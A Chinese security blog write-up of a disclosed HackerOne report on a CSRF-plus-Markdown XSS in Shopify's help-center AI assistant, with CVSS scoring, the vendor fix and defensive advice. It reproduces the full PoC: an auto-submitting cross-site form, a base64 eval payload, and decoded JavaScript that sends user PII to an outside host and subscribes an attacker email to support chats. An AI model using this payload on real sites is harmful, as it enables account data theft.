#  【$1,600】Shopify帮助中心AI助手XSS漏洞  
原创 骨哥说事
                    骨哥说事  骨哥说事   2026-06-19 04:04  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/  
  
**不想错过任何消息？设置星标****↓ ↓ ↓**  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
  
**导语**  
  
随着AI客服与智能助手成为SaaS平台的标配，其交互逻辑的复杂性也悄然引入了新的安全边界。2024年5月16日，国外白帽研究员 saltymermaid  
 向Shopify提交了一份高质量的漏洞报告，成功在 help.shopify.com  
 帮助中心AI助手的“问候语（Greeting）”流程中，利用CSRF结合Markdown渲染特性，触发了反射型XSS。该漏洞不仅能在已认证会话中执行任意JavaScript代码，还能窃取用户PII信息并篡改客服会话订阅状态。今天，我们将完整还原这份PoC的攻击链路，逐行拆解代码细节，并提炼出对开发者与安全研究者极具价值的防御经验。  
## 漏洞核心逻辑：从“问候语”到XSS的跳板  
  
Shopify帮助中心内置了AI对话助手，为提升交互体验，系统支持使用Markdown语法渲染回复内容。研究员在测试过程中发现，AI助手的问候语（Greeting）参数可通过跨站POST请求写入用户会话状态。由于该参数在后续渲染时未对Markdown链接目标进行严格过滤，攻击者即可构造包含 javascript:  
 协议的Markdown图片/链接语法。当受害者打开恶意页面并触发渲染后的问候语时，浏览器便会执行内嵌的JS代码，从而在已认证的 help.shopify.com  
 会话中完成XSS攻击。  
## PoC完整流程与具体代码还原  
  
为满足技术爱好者对实战细节的探究需求，以下完整呈现研究员提交的PoC HTML结构、Base64载荷及解码后的执行逻辑。代码已按原始报告内容1:1保留，便于读者对照分析。  
### 1. 攻击载体HTML（CSRF+自动跳转）  
```
<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Shopify Search Form</title></head><body>    Please hold...    <!-- 第一步：跨站POST请求，将恶意greeting写入受害者会话 -->    <form id="post-form" action="https://help.shopify.com/en/search?_data=routes%2F%28%24locale%29.search" method="POST">        <input type="hidden" name="query" value="Is this XSS?">        <input type="hidden" name="greeting" value="![Mouse wheel click here for more info...](javascript:eval(atob('ZmV0Y2goYC8v████████/JHtKU09OLnN0cmluZ2lmeSh3aW5kb3cuX19yZW1peENvbnRleHQuc3RhdGUubG9hZGVyRGF0YS5yb290LnVzZXJJbmZvKX1gKTsgZmV0Y2goIi9tZXNzYWdlcy9ncmFwaHFsIiwgeyAiaGVhZGVycyI6IHsgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwgIngtc2hvcGlmeS1yZWFjdC14aHIiOiAiMSIgfSwgImJvZHkiOiBgeyJ2YXJpYWJsZXMiOnt9LCJxdWVyeSI6InF1ZXJ5IGNvbnZzIHsgY29udmVyc2F0aW9ucyhmaXJzdDogMTAwKSB7IGVkZ2VzIHsgbm9kZSB7IGlkIH0gfSB9IH0ifWAsICJtZXRob2QiOiAiUE9TVCIgfSkgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKSAudGhlbihkYXRhID0+IHsgY29uc3QgY2lkID0gSlNPTi5wYXJzZShkYXRhKS5kYXRhLmNvbnZlcnNhdGlvbnMuZWRnZXNbMF0ubm9kZS5pZCA/PyBudWxsOyBmZXRjaCgiL21lc3NhZ2VzL2dyYXBocWwiLCB7ICJoZWFkZXJzIjogeyAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL2pzb24iLCAieC1zaG9waWZ5LXJlYWN0LXhociI6ICIxIiB9LCAiYm9keSI6IGB7InZhcmlhYmxlcyI6e30sInF1ZXJ5IjoibXV0YXRpb24gc3Vic2NyaWJlckNyZWF0ZSB7IHN1YnNjcmliZXJDcmVhdGUoY29udmVyc2F0aW9uSWQ6IFxcIiR7Y2lkfVxcIiwgZW1haWw6IFxcInNhbHR5bWVybWFpZEB3ZWFyZWhhY2tlcm9uZS5jb21cXCIpIHsgX190eXBlbmFtZSB9fSJ9YCwgIm1ldGhvZCI6ICJQT1NUIiB9KTsgfSk7')))">    </form>    <!-- 第二步：延迟2秒后GET请求，将受害者重定向至渲染页面 -->    <form id="get-form" action="https://help.shopify.com/en/search?_data=routes%2F%28%24locale%29.search" method="GET">        <input type="hidden" name="q" value="Is this XSS?">    </form>    <script>        document.getElementById('post-form').submit();        setTimeout(() => {            document.getElementById('get-form').submit();        },2000);    </script></body></html>
```  
### 2. Base64解码后的XSS执行逻辑（核心Payload）  
  
上述HTML中 greeting  
 参数使用了Markdown图片语法：![alt](javascript:eval(atob('...')))  
。Base64字符串解码后，实际执行的JavaScript代码如下：  
```
// 1. 泄露受害者PII信息至攻击者控制的域名（最坏情况）fetch(`//████████?${JSON.stringify(window.__remixContext.state.loaderData.root.userInfo)}`);// 2. 获取受害者最近一条客服会话IDfetch("/messages/graphql", {"headers": {    "content-type": "application/json",    "x-shopify-react-xhr": "1"  },"body": `{"variables":{},"query":"query convs { conversations(last: 1) { edges { node { id } } } }"}`,"method": "POST"}).then(response => response.text()).then(data => {   // 3. 订阅该会话，将攻击者邮箱加入对话通知列表   const cid = JSON.parse(data).data.conversations.edges[0].node.id ?? null;   fetch("/messages/graphql", {     "headers": {       "content-type": "application/json",       "x-shopify-react-xhr": "1"     },     "body": `{"variables":{},"query":"mutation subscriberCreate { subscriberCreate(conversationId: \\"${cid}\\", email: \\"saltymermaid@wearehackerone.com\\") { __typename }}"}`,     "method": "POST"   });});
```  
### 3. 触发条件说明  
  
由于渲染后的链接默认带有 target="_blank"  
 属性，现代浏览器出于安全策略会拦截普通左键点击的 javascript:  
 协议。研究员指出，受害者需使用**鼠标滚轮点击（Mouse Wheel Click）**该链接方可触发XSS。一旦触发，开发者控制台网络面板即可观察到上述GraphQL请求与PII外发行为。  
## 攻击链深度解析  
1. **CSRF作为“状态写入器”**  
帮助中心搜索路由未严格校验请求来源与CSRF Token，攻击者通过跨站POST将恶意 greeting  
 值注入受害者会话。这一步绕过了常规的前端输入限制，直接篡改了服务端/客户端状态。  
  
1. **Markdown渲染的“协议盲区”**  
系统使用Markdown解析器将 greeting  
 转换为HTML。多数轻量级解析器会将 ![text](url)  
 渲染为 <a href="url"><img src="..."></a>  
 或类似结构。若未对 href  
 属性进行协议白名单过滤（如仅允许 http/https/mailto  
），javascript:  
 或 data:  
 协议即可直接执行。  
  
1. **GraphQL接口的“二次利用”**  
XSS触发后，Payload并未停留在简单的Cookie窃取，而是直接调用Shopify内部的GraphQL端点。通过查询 conversations  
 获取会话ID，再执行 subscriberCreate  
 突变操作，实现了业务逻辑层面的越权篡改。这种“XSS+内部API调用”的模式在SaaS平台中极具破坏性。  
  
## 影响评估与官方修复方案  
  
研究员基于Shopify漏洞赏金计算器给出了详细的CVSS评分：  
- **Base Score**  
: 4.2 (AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N)  
  
- **Environment Score**  
: 3.0 (Non-Core, CR/IR/AR均调低)  
  
- **核心影响**  
：可窃取 window.__remixContext.state.loaderData.root.userInfo  
 中的姓名、邮箱、店铺ID等PII信息；可强制将攻击者邮箱订阅至受害者客服会话，干扰正常支持流程。  
  
- **修复方案**  
：Shopify官方已移除该AI助手问候语中由攻击者控制的输入路径，从根本上切断了状态注入点。  
  
## 五、 给开发者与安全研究者的实战建议  
1. **Markdown渲染必须“零信任”**  
任何支持用户输入或会话状态反射的Markdown解析，务必使用经过安全审计的库（如 DOMPurify  
、markdown-it-sanitizer  
），并严格配置协议白名单。禁止直接输出未过滤的 href  
/src  
 属性。  
  
1. **CSRF防护不能仅依赖同源策略**  
涉及状态变更的POST请求必须绑定一次性CSRF Token，并校验 Origin  
/Referer  
 头。对于AI助手、搜索路由等高频交互接口，建议引入SameSite Cookie策略与请求签名验证。  
  
1. **内部API需做“XSS隔离”**  
GraphQL/REST接口不应默认信任前端会话。关键业务操作（如订阅、修改配置）应增加二次验证或权限边界检查，避免XSS成为横向移动的跳板。  
  
1. **安全测试视角：关注“边缘交互态”**  
AI助手的问候语、自动回复模板、会话缓存等“非核心业务流”往往是安全测试的盲区。白帽研究提示我们：越贴近用户体验的细节，越需要严谨的安全边界设计。  
  
## 总结与展望  
  
这份来自 saltymermaid  
 的报告再次证明：现代Web应用的安全防线，往往不在复杂的加密算法中，而在一次未过滤的Markdown渲染、一个缺失CSRF校验的POST路由里。随着AI功能深度嵌入SaaS产品，状态管理、富文本渲染与内部API调用的耦合度将持续升高。对开发者而言，建立“输入即威胁”的防御思维、完善自动化安全测试流水线；对爱好者而言，深入研读高质量PoC、理解攻击链的组装逻辑，是提升实战能力的最佳路径。  
  
安全没有终点，只有不断迭代的边界。希望本文的拆解能为你带来启发，也欢迎在评论区分享你对AI交互安全设计的看法。  
### 参考资料  
1. **来源：HackerOne公开报告**  
 - saltymermaid提交的Shopify Help Center AI助手XSS漏洞详情（含完整PoC、CVSS评估与修复说明）  
  
1. **参考：OWASP Foundation**  
 - 《Markdown Sanitization Cheat Sheet》与《CSRF Prevention Cheat Sheet》（提供富文本过滤与跨站请求伪造防御的行业标准实践）  
  
1. **参考：Shopify Bug Bounty Program**  
 - 官方漏洞赏金计划说明与历史修复案例归档（用于理解SaaS平台安全响应流程与评分标准）  
  
- END -  
  
  
**感谢阅读，如果觉得还不错的话，动动手指给个三连吧～**  
  
